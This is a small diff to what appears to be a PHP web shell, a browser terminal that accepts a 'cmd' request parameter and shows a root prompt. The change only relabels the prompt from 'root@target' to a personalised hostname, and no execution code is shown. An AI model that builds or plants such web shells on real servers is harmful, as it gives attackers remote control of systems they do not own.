@@ -41,7 +41,7 @@ if (isset($_GET['cmd'])) {
     <div id="term">
         <div id="log"></div>
         <div id="input-line">
-            <span class="prompt" id="p_label">root@target:<?php echo $_SESSION['pwd']; ?># </span>
+            <span class="prompt" id="p_label">root(Avi twil)@tech-world:<?php echo $_SESSION['pwd']; ?># </span>
             <input type="text" id="shell_input" autofocus autocomplete="off">
         </div>
     </div>
